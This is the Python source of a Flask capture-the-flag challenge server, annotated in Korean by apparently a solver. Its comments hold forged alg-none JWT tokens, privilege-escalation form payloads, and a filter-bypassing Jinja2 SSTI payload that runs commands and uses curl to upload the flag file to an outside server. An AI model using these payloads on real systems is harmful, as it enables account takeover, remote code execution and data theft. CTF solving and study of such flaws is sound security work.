#!/usr/bin/env python3
from flask import Flask, render_template, render_template_string, request, redirect, make_response
import jwt, html, hashlib, random
from config import *

port = 2000
app = Flask (__name__, static_url_path = "/static")

users = {}
authorizedAdmin = {}
adminPrivileges = [[None]*3]*500

adminPrivileges [0][0] = 0 # UID
adminPrivileges [0][1] = "Santa" #Uname
adminPrivileges [0][2] = SantaSecret

@app.route ('/', methods = ['GET'])
def index():
    token = request.cookies.get ("auth")

    if (token != None):
        userData = DecodeJWT (token)
        try:
            admin = False
            authorized = False

            if (userData ["type"] == "admin"):
                admin = True

            if (userData["user"] in authorizedAdmin):
                authorized = True

            resp = render_template ("index.html", loggedIn = True, user = userData["user"], admin = admin, authorized = authorized)
        except:
            resp = render_template ("index.html", loggedIn = False)
    else:
        resp = render_template ("index.html", loggedIn = False)

    return resp

@app.route ('/register', methods=['GET', 'POST'])
def register ():
    if (request.method == 'GET'):
        resp = render_template ("action.html", action="register")
    elif (request.method == 'POST'):
        user = request.form.get ('user')
        passwd = request.form.get ('pass')

        if (user not in users):
            users[user] = passwd
            token = jwt.encode ({'type': 'user', 'user':user}, JWTSecret, algorithm = 'HS256')
            resp = make_response (redirect ("/"))
            resp.set_cookie ('auth', token)
            #resp.set_cookie ('auth', jwt.encode ({'type': 'admin', 'user':'g0pher'}, JWTSecret, algorithm = 'HS256'))
        else:
            resp = render_template ("error.html", error = "User already exists.")
    return resp

@app.route ('/login', methods=['GET', 'POST'])
def login ():
    if (request.method == 'GET'):
        resp = render_template ("action.html", action="login")
    elif (request.method == 'POST'):
        user = request.form.get ('user')
        passwd = request.form.get ('pass')

        if (user in users):
            if (users[user] == passwd):
                token = jwt.encode ({'type': 'user', 'user':user}, JWTSecret, algorithm = 'HS256')
                resp = make_response (redirect ("/"))
                resp.set_cookie ('auth', token)
            else:
                resp = render_template ("error.html", error = "Wrong password.")
        else:
            resp = render_template ("error.html", error = "No such user.")

    return resp

@app.route ('/logout', methods=['GET', 'POST'])
def logout ():
    resp = make_response (render_template ("index.html", loggedIn = False))
    resp.set_cookie ('auth', '')
    return resp

# origin : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJnMHBoZXIifQ.DaPxDr78Yw4pjJ5bh03sLC1hf6vbF1J9qc3Vq8A5WA4
# attack : eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiZzBwaGVyIn0.
@app.route ('/authorize', methods=['POST'])
def authorize ():
    token = request.cookies.get ("auth")

    if (token != None):
        try:
            userData = DecodeJWT (token)
            # admin type만 이용 가능. 이 함수를 이용하려면 type을 admin으로 바꾸는 과정이 선행되어야함.
            if (userData["type"] != "admin"):
                return render_template ("error.html", error = "Unauthorized.")

            uid = 1
            hsh = hashlib.md5 (userData ["user"].encode ()).hexdigest ()

            for c in hsh: # uid는 user명의 해시값에 있는 숫자를 모두 더한 것 +1임
                if (c in "0123456789"):
                    uid += int (c)

            step = int (request.args.get ("step"))
            if (step == 1):
                adminPrivileges [uid][0] = uid
                adminPrivileges [uid][1] = userData ["user"]
                adminPrivileges [uid][2] = request.form.get ('privilegeCode')
                # 아마 위 코드가 실행되면 모두가 같은 데이터를 갖게 될 것.
                # 산타의 정보도 위 정보로 바뀔것임.
                # step=1&privilegeCode=g0pher
'''
<div>
    <form action="/authorize?step=1" method="post">
        <input name="privilegeCode" value="g0pher">
        <input type="submit">
    </form>
</div>
'''
                resp = make_response (redirect ("/"))
            elif (step == 2):
                userpss = adminPrivileges [uid][2]
                # Is the user actually santa? 산타의 정보를 맞추면 권한상승
                uid = adminPrivileges [0][0]
                usr = adminPrivileges [0][1]
                pss = adminPrivileges [0][2]
                # step=2&accessCode=71g0pherg0pherg0pher
                if (request.form.get('accessCode') == str (uid) + usr + pss + userpss):
                    authorizedAdmin [userData ["user"]] = True
                    #os.system ("curl https://lapland.htsp.ro/adminauth") # Announce new admin authorization
'''
<div>
    <form action="/authorize?step=2" method="post">
        <input name="accessCode" value="71g0pherg0pherg0pher">
        <input type="submit">
    </form>
</div>
'''
 
                    resp = make_response (redirect ("/"))
                else:
                    resp = render_template ("error.html", error = "Access Code is incorrect.")
            else:
                resp = render_template ("error.html", error = "Unauthorized.")
        except:
            resp = render_template ("error.html", error = "Unknown Error.")
    else:
        resp = render_template ("error.html", error = "Unauthorized.")

    return resp

@app.route ('/makehat', methods=['GET'])
def makehat ():
    hatName = request.args.get ("hatName")
    token = request.cookies.get ("auth")
    blacklist = ["config", "self", "request", "[", "]", '"', "_", "+", " ", "join", "%", "%25"]
    if (hatName == None):
        return render_template ("error.html", error = "Your hat has no name!")
 
    for c in blacklist:
        if (c in hatName):
            return render_template ("error.html", error = "That's a hella weird Hat Name, maggot.")


    # authorizedAdmin=dict(dlwotmd=True)
    # eval('\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64\x41\x64\x6d\x69\x6e\x5b\x27\x67\x30\x70\x68\x65\x72\x27\x5d\x20\x3d\x20\x54\x72\x75\x65')
    # resp=make_response().set_cookie('auth',jwt.encode({'type': 'admin', 'user':'g0pher'}, JWTSecret, algorithm = 'HS256'))
    if (len (hatName.split (",")) > 2):
        return render_template ("error.html", error = "How many commas do you even want to have?")

    page = render_template ("hat.html", hat = random.randint (0, 9), hatName = hatName)
    # attack1 : eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiZzBwaGVyIn0.
    # attack2 : eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiZzBwaGVyIiwicGFzcyI6IiNnMHBoZXIifQ.
    if (token != None):
        userData = DecodeJWT (token)
        try:
            authorized = False
            # authorizedAdmin에 id가 있어야 함.
            if ((userData["user"] in authorizedAdmin) and (users[userData["user"]] == userData["pass"])):
                authorized = True # and what
                resp = render_template_string (page) # SSTI 가능!!!!!!!!!!!!!!
            else:
                resp = render_template ("error.html", error = "Unauthorized.")
        except:
            resp = render_template ("error.html", error = "Error in viewing hat.")
    else:
        resp = render_template ("error.html", error = "Unauthorized.")
    
    return resp

if __name__ == '__main__':
    app.run (host = '0.0.0.0', port = port)


# subprocess.Popen('ls')
# {{({}|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()).pop(215)('ls',stdout=-1).stdout.read()}}
# b'__pycache__\nconfig.py\nserver.py\nstatic\ntemplates\nunusual_flag.mp4\n'\

# curl로 내 서버에 파일 업로드하여 추출
# http://challs.xmas.htsp.ro:11005/makehat?hatName={{({}|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5fbase\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()).pop(215)(%27%27%27curl---F--file=@./unusual\x5fflag.mp4--http://myserver.com/getfile%27%27%27.split(%27--%27),stdout=-1).stdout.read()}}





# 여기서 flask pipe filter 아이디어를 얻음.
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#filter-bypass


# flask pipe filter 종류
# https://jinja.palletsprojects.com/en/2.10.x/templates/#list-of-builtin-filters


# 여기서 언더바 bypass 아이디어를 얻음.
# https://posix.tistory.com/111



# ssti 정리가 잘 되어있었다.
# https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti